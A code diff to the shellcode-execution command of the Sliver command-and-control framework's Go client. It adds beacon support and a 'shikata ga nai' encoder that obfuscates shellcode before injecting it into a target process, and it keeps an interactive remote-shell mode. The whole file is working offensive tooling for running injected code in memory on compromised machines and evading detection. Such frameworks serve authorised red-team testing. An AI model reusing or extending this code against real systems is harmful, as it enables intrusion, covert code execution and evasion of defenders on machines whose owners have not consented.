@@ -23,29 +23,35 @@ import (
 	"context"
 	"fmt"
 	"io"
-	"io/ioutil"
 	"log"
 	"os"
 
 	"github.com/bishopfox/sliver/client/console"
 	"github.com/bishopfox/sliver/client/core"
+	"github.com/bishopfox/sliver/protobuf/clientpb"
 	"github.com/bishopfox/sliver/protobuf/sliverpb"
-	"golang.org/x/crypto/ssh/terminal"
+	"golang.org/x/term"
+	"google.golang.org/protobuf/proto"
 
 	"github.com/desertbit/grumble"
 )
 
 // ExecuteShellcodeCmd - Execute shellcode in-memory
 func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient) {
-	session := con.ActiveSession.GetInteractive()
-	if session == nil {
+	session, beacon := con.ActiveTarget.GetInteractive()
+	if session == nil && beacon == nil {
 		return
 	}
 
+	rwxPages := ctx.Flags.Bool("rwx-pages")
 	interactive := ctx.Flags.Bool("interactive")
+	if interactive && beacon != nil {
+		con.PrintErrorf("Interactive shellcode can only be executed in a session\n")
+		return
+	}
 	pid := ctx.Flags.Uint("pid")
 	shellcodePath := ctx.Args.String("filepath")
-	shellcodeBin, err := ioutil.ReadFile(shellcodePath)
+	shellcodeBin, err := os.ReadFile(shellcodePath)
 	if err != nil {
 		con.PrintErrorf("%s\n", err.Error())
 		return
@@ -54,18 +60,47 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 		con.PrintErrorf("Cannot use both `--pid` and `--interactive`\n")
 		return
 	}
+	shikataGaNai := ctx.Flags.Bool("shikata-ga-nai")
+	if shikataGaNai {
+		if !rwxPages {
+			con.PrintErrorf("Cannot use shikata ga nai without RWX pages enabled\n")
+			return
+		}
+		arch := ctx.Flags.String("architecture")
+		if arch != "386" && arch != "amd64" {
+			con.PrintErrorf("Invalid shikata ga nai architecture (must be 386 or amd64)\n")
+			return
+		}
+		iter := ctx.Flags.Int("iterations")
+		con.PrintInfof("Encoding shellcode ...\n")
+		resp, err := con.Rpc.ShellcodeEncoder(context.Background(), &clientpb.ShellcodeEncodeReq{
+			Encoder:      clientpb.ShellcodeEncoder_SHIKATA_GA_NAI,
+			Architecture: arch,
+			Iterations:   uint32(iter),
+			BadChars:     []byte{},
+			Data:         shellcodeBin,
+		})
+		if err != nil {
+			con.PrintErrorf("%s\n", err)
+			return
+		}
+		oldSize := len(shellcodeBin)
+		shellcodeBin = resp.GetData()
+		con.PrintInfof("Shellcode encoded in %d iterations (%d bytes -> %d bytes)\n", iter, oldSize, len(shellcodeBin))
+	}
+
 	if interactive {
-		executeInteractive(ctx, ctx.Flags.String("process"), shellcodeBin, ctx.Flags.Bool("rwx-pages"), con)
+		executeInteractive(ctx, ctx.Flags.String("process"), shellcodeBin, rwxPages, con)
 		return
 	}
 	ctrl := make(chan bool)
 	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
 	con.SpinUntil(msg, ctrl)
-	task, err := con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
+	shellcodeTask, err := con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
 		Data:     shellcodeBin,
-		RWXPages: ctx.Flags.Bool("rwx-pages"),
+		RWXPages: rwxPages,
 		Pid:      uint32(pid),
-		Request:  con.ActiveSession.Request(ctx),
+		Request:  con.ActiveTarget.Request(ctx),
 	})
 	ctrl <- true
 	<-ctrl
@@ -73,16 +108,34 @@ func ExecuteShellcodeCmd(ctx *grumble.Context, con *console.SliverConsoleClient)
 		con.PrintErrorf("%s\n", err)
 		return
 	}
+
+	if shellcodeTask.Response != nil && shellcodeTask.Response.Async {
+		con.AddBeaconCallback(shellcodeTask.Response.TaskID, func(task *clientpb.BeaconTask) {
+			err = proto.Unmarshal(task.Response, shellcodeTask)
+			if err != nil {
+				con.PrintErrorf("Failed to decode response %s\n", err)
+				return
+			}
+			PrintExecuteShellcode(shellcodeTask, con)
+		})
+		con.PrintAsyncResponse(shellcodeTask.Response)
+	} else {
+		PrintExecuteShellcode(shellcodeTask, con)
+	}
+}
+
+// PrintExecuteShellcode - Display result of shellcode execution
+func PrintExecuteShellcode(task *sliverpb.Task, con *console.SliverConsoleClient) {
 	if task.Response.GetErr() != "" {
 		con.PrintErrorf("%s\n", task.Response.GetErr())
-		return
+	} else {
+		con.PrintInfof("Executed shellcode on target\n")
 	}
-	con.PrintInfof("Executed shellcode on target\n")
 }
 
 func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte, rwxPages bool, con *console.SliverConsoleClient) {
 	// Check active session
-	session := con.ActiveSession.GetInteractive()
+	session := con.ActiveTarget.GetSessionInteractive()
 	if session == nil {
 		return
 	}
@@ -97,21 +150,21 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 	})
 
 	if err != nil {
-		con.PrintErrorf("Error: %v\n", err)
+		con.PrintErrorf("%s\n", err)
 		return
 	}
 
-	tunnel := core.Tunnels.Start(rpcTunnel.GetTunnelID(), rpcTunnel.GetSessionID())
+	tunnel := core.GetTunnels().Start(rpcTunnel.GetTunnelID(), rpcTunnel.GetSessionID())
 
 	shell, err := con.Rpc.Shell(context.Background(), &sliverpb.ShellReq{
-		Request:   con.ActiveSession.Request(ctx),
+		Request:   con.ActiveTarget.Request(ctx),
 		Path:      hostProc,
 		EnablePTY: !noPty,
 		TunnelID:  tunnel.ID,
 	})
 
 	if err != nil {
-		con.PrintErrorf("Error: %v\n", err)
+		con.PrintErrorf("%s\n", err)
 		return
 	}
 	// Retrieve PID and start remote task
@@ -121,7 +174,7 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 	msg := fmt.Sprintf("Sending shellcode to %s ...", session.GetName())
 	con.SpinUntil(msg, ctrl)
 	_, err = con.Rpc.Task(context.Background(), &sliverpb.TaskReq{
-		Request:  con.ActiveSession.Request(ctx),
+		Request:  con.ActiveTarget.Request(ctx),
 		Pid:      pid,
 		Data:     shellcode,
 		RWXPages: rwxPages,
@@ -130,16 +183,16 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 	<-ctrl
 
 	if err != nil {
-		con.PrintErrorf("Error: %v", err)
+		con.PrintErrorf("%s\n", err)
 		return
 	}
 
 	log.Printf("Bound remote program pid %d to tunnel %d", shell.Pid, shell.TunnelID)
 	con.PrintInfof("Started remote shell with pid %d\n\n", shell.Pid)
 
-	var oldState *terminal.State
+	var oldState *term.State
 	if !noPty {
-		oldState, err = terminal.MakeRaw(0)
+		oldState, err = term.MakeRaw(0)
 		log.Printf("Saving terminal state: %v", oldState)
 		if err != nil {
 			con.PrintErrorf("Failed to save terminal state\n")
@@ -171,7 +224,7 @@ func executeInteractive(ctx *grumble.Context, hostProc string, shellcode []byte,
 
 	if !noPty {
 		log.Printf("Restoring terminal state ...")
-		terminal.Restore(0, oldState)
+		term.Restore(0, oldState)
 	}
 
 	log.Printf("Exit interactive")
